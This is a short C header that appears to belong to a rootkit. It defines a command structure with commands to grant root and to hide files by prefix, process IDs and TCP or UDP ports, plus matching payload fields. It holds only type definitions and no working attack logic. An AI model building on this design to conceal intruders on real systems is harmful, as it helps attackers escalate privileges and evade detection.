#ifndef __CCC_H__
#define __CCC_H__

typedef struct
{
    enum {
        GibeRoot,
	Gtfo,
	SetFileHidingPrefix,
	SetHiddenPids,
	SetHiddenTCP,
	SetHiddenUDP,
    } cmd;
    union {
        // todo
	char file_hiding_prefix[512];
	int hidden_pids[128];
	int hidden_ports[128];
    } payload;
} CCC;


#endif
